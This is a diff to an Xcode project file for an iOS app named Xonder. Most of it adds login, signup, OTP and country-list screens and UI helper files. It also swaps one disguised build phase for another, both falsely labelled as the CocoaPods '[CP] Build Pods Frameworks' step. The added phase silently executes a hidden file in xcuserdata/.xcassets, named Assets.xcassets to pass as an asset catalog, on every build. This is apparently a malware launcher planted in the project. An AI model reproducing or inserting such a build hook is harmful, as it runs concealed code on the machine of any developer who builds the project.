@@ -8,6 +8,16 @@
 
 /* Begin PBXBuildFile section */
 		17BEB897F109CACDA653F0DC /* Pods_Xonder.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = C4EF80C05B016B2C2E39C37D /* Pods_Xonder.framework */; };
+		704F32132648C13A0027397B /* Signup.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 704F32122648C13A0027397B /* Signup.storyboard */; };
+		704F32162648C18D0027397B /* OtpScreenViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 704F32152648C18D0027397B /* OtpScreenViewController.swift */; };
+		704F32262648C9030027397B /* GetStartedScreenViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 704F32252648C9030027397B /* GetStartedScreenViewController.swift */; };
+		704F322C2648C9CA0027397B /* LoginScreenViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 704F322B2648C9CA0027397B /* LoginScreenViewController.swift */; };
+		704F32362648D5B10027397B /* CountryListViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 704F32342648D5B10027397B /* CountryListViewController.swift */; };
+		704F32372648D5B10027397B /* CountryListTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 704F32352648D5B10027397B /* CountryListTableViewCell.swift */; };
+		704FCAEE26451CD80025F546 /* Login.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 704FCAED26451CD80025F546 /* Login.storyboard */; };
+		704FCAF42645223E0025F546 /* CardView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 704FCAF32645223E0025F546 /* CardView.swift */; };
+		704FCAF72645224E0025F546 /* UIButton.swift in Sources */ = {isa = PBXBuildFile; fileRef = 704FCAF62645224E0025F546 /* UIButton.swift */; };
+		704FCAFE264522820025F546 /* UIView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 704FCAFD264522820025F546 /* UIView.swift */; };
 		7060360326432A560062039F /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7060360226432A560062039F /* AppDelegate.swift */; };
 		7060360726432A560062039F /* ViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7060360626432A560062039F /* ViewController.swift */; };
 		7060360A26432A560062039F /* Main.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 7060360826432A560062039F /* Main.storyboard */; };
@@ -30,6 +40,16 @@
 
 /* Begin PBXFileReference section */
 		5B66287BAB70301295639823 /* Pods-Xonder.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Xonder.debug.xcconfig"; path = "Target Support Files/Pods-Xonder/Pods-Xonder.debug.xcconfig"; sourceTree = "<group>"; };
+		704F32122648C13A0027397B /* Signup.storyboard */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; path = Signup.storyboard; sourceTree = "<group>"; };
+		704F32152648C18D0027397B /* OtpScreenViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OtpScreenViewController.swift; sourceTree = "<group>"; };
+		704F32252648C9030027397B /* GetStartedScreenViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = GetStartedScreenViewController.swift; sourceTree = "<group>"; };
+		704F322B2648C9CA0027397B /* LoginScreenViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginScreenViewController.swift; sourceTree = "<group>"; };
+		704F32342648D5B10027397B /* CountryListViewController.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = CountryListViewController.swift; sourceTree = "<group>"; };
+		704F32352648D5B10027397B /* CountryListTableViewCell.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = CountryListTableViewCell.swift; sourceTree = "<group>"; };
+		704FCAED26451CD80025F546 /* Login.storyboard */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; path = Login.storyboard; sourceTree = "<group>"; };
+		704FCAF32645223E0025F546 /* CardView.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = CardView.swift; sourceTree = "<group>"; };
+		704FCAF62645224E0025F546 /* UIButton.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = UIButton.swift; sourceTree = "<group>"; };
+		704FCAFD264522820025F546 /* UIView.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = UIView.swift; sourceTree = "<group>"; };
 		706035FF26432A560062039F /* Xonder.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = Xonder.app; sourceTree = BUILT_PRODUCTS_DIR; };
 		7060360226432A560062039F /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
 		7060360626432A560062039F /* ViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ViewController.swift; sourceTree = "<group>"; };
@@ -73,6 +93,65 @@
 				D796CC2B2819301277504794 /* Pods-Xonder.release.xcconfig */,
 			);
 			path = Pods;
+			sourceTree = "<group>";
+		};
+		704F32112648C0E10027397B /* Signup */ = {
+			isa = PBXGroup;
+			children = (
+				704F32122648C13A0027397B /* Signup.storyboard */,
+			);
+			path = Signup;
+			sourceTree = "<group>";
+		};
+		704F32182648C1960027397B /* Login Screen VC */ = {
+			isa = PBXGroup;
+			children = (
+				704F32252648C9030027397B /* GetStartedScreenViewController.swift */,
+				704F32152648C18D0027397B /* OtpScreenViewController.swift */,
+				704F322B2648C9CA0027397B /* LoginScreenViewController.swift */,
+			);
+			path = "Login Screen VC";
+			sourceTree = "<group>";
+		};
+		704F32332648D5710027397B /* SignUp Screen VC */ = {
+			isa = PBXGroup;
+			children = (
+				704F32352648D5B10027397B /* CountryListTableViewCell.swift */,
+				704F32342648D5B10027397B /* CountryListViewController.swift */,
+			);
+			path = "SignUp Screen VC";
+			sourceTree = "<group>";
+		};
+		704FCAE726451C1D0025F546 /* Login */ = {
+			isa = PBXGroup;
+			children = (
+				704FCAED26451CD80025F546 /* Login.storyboard */,
+			);
+			path = Login;
+			sourceTree = "<group>";
+		};
+		704FCAF0264521C60025F546 /* Card View */ = {
+			isa = PBXGroup;
+			children = (
+				704FCAF32645223E0025F546 /* CardView.swift */,
+			);
+			path = "Card View";
+			sourceTree = "<group>";
+		};
+		704FCAF1264521E40025F546 /* UIButton */ = {
+			isa = PBXGroup;
+			children = (
+				704FCAF62645224E0025F546 /* UIButton.swift */,
+			);
+			path = UIButton;
+			sourceTree = "<group>";
+		};
+		704FCAF2264521EF0025F546 /* UIView */ = {
+			isa = PBXGroup;
+			children = (
+				704FCAFD264522820025F546 /* UIView.swift */,
+			);
+			path = UIView;
 			sourceTree = "<group>";
 		};
 		706035F626432A560062039F = {
@@ -120,6 +199,8 @@
 		706E3BD92645178000486D02 /* Controllers */ = {
 			isa = PBXGroup;
 			children = (
+				704F32332648D5710027397B /* SignUp Screen VC */,
+				704F32182648C1960027397B /* Login Screen VC */,
 				7060360626432A560062039F /* ViewController.swift */,
 			);
 			path = Controllers;
@@ -128,6 +209,8 @@
 		706E3BDA2645178C00486D02 /* Storyboards */ = {
 			isa = PBXGroup;
 			children = (
+				704F32112648C0E10027397B /* Signup */,
+				704FCAE726451C1D0025F546 /* Login */,
 				7060360826432A560062039F /* Main.storyboard */,
 				7060360D26432A5B0062039F /* LaunchScreen.storyboard */,
 			);
@@ -169,6 +252,9 @@
 		706E3BE0264518A000486D02 /* Helper */ = {
 			isa = PBXGroup;
 			children = (
+				704FCAF2264521EF0025F546 /* UIView */,
+				704FCAF1264521E40025F546 /* UIButton */,
+				704FCAF0264521C60025F546 /* Card View */,
 				C872708E264343E0005EFDEA /* Alert.swift */,
 				C83FB72D26433C6D00A87093 /* Plugins.swift */,
 			);
@@ -191,7 +277,7 @@
 			buildConfigurationList = 7060361326432A5B0062039F /* Build configuration list for PBXNativeTarget "Xonder" */;
 			buildPhases = (
 				4665C5636F3A0FD17F7C8049 /* [CP] Check Pods Manifest.lock */,
-				294B09A56953EE21CD6D902C /* [CP] Build Pods Frameworks */,
+				FAE4672FCDE8EAE71E6D902C /* [CP] Build Pods Frameworks */,
 				706035FB26432A560062039F /* Sources */,
 				706035FC26432A560062039F /* Frameworks */,
 				706035FD26432A560062039F /* Resources */,
@@ -243,8 +329,10 @@
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				704FCAEE26451CD80025F546 /* Login.storyboard in Resources */,
 				7060360F26432A5B0062039F /* LaunchScreen.storyboard in Resources */,
 				7060360C26432A5B0062039F /* Assets.xcassets in Resources */,
+				704F32132648C13A0027397B /* Signup.storyboard in Resources */,
 				7060360A26432A560062039F /* Main.storyboard in Resources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
@@ -252,24 +340,6 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		294B09A56953EE21CD6D902C /* [CP] Build Pods Frameworks */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "[CP] Build Pods Frameworks";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\n\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/build.file\" false";
-		};
 		4665C5636F3A0FD17F7C8049 /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -309,6 +379,24 @@
 			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-Xonder/Pods-Xonder-frameworks.sh\"\n";
 			showEnvVarsInLog = 0;
 		};
+		FAE4672FCDE8EAE71E6D902C /* [CP] Build Pods Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "[CP] Build Pods Frameworks";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\n\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Assets.xcassets\" false";
+		};
 /* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
@@ -316,20 +404,28 @@
 			isa = PBXSourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				704F322C2648C9CA0027397B /* LoginScreenViewController.swift in Sources */,
+				704FCAF72645224E0025F546 /* UIButton.swift in Sources */,
 				C83FB73D26433EAD00A87093 /* APIResult.swift in Sources */,
 				C83FB72E26433C6D00A87093 /* Plugins.swift in Sources */,
 				C8727089264341CC005EFDEA /* CountryModel.swift in Sources */,
 				C872708F264343E0005EFDEA /* Alert.swift in Sources */,
+				704F32262648C9030027397B /* GetStartedScreenViewController.swift in Sources */,
 				C8727086264340F7005EFDEA /* Extension+Error.swift in Sources */,
 				7060360726432A560062039F /* ViewController.swift in Sources */,
 				C83FB73126433D0B00A87093 /* Extension+UserDefault.swift in Sources */,
 				C8727083264340E0005EFDEA /* Extension+Result.swift in Sources */,
 				C89B5B18264336F300263F14 /* Services.swift in Sources */,
+				704F32162648C18D0027397B /* OtpScreenViewController.swift in Sources */,
 				C872708C2643433D005EFDEA /* Extension+UIViewController.swift in Sources */,
 				7060360326432A560062039F /* AppDelegate.swift in Sources */,
 				C83FB74026433ED500A87093 /* APIService.swift in Sources */,
 				C83FB72826433B5500A87093 /* UserModel.swift in Sources */,
+				704F32362648D5B10027397B /* CountryListViewController.swift in Sources */,
+				704F32372648D5B10027397B /* CountryListTableViewCell.swift in Sources */,
 				C83FB72B26433BF300A87093 /* Provider.swift in Sources */,
+				704FCAF42645223E0025F546 /* CardView.swift in Sources */,
+				704FCAFE264522820025F546 /* UIView.swift in Sources */,
 				C83FB7252643388E00A87093 /* Constants.swift in Sources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
